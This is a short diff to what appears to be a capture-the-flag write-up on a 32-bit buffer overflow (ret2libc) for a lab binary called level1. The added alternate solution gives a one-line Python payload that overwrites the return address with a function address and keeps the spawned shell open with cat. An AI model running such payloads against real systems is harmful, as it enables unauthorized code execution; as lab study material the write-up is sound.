@@ -8,3 +8,12 @@ Buffer Overflow - ret2libc
 '\x58\xcc\xf8\xb7' -> Address of "/bin/sh" given to system
 
 Then cat to avoid the shell to close
+
+Alternate Solution:
+
+sub esp, 0x50
+
+0x50 ou 80 buffer's length
+0x8048444 <= run function's address
+
+(python -c 'print("A"*76+"\x44\x84\x04\x08")';cat) | ./level1
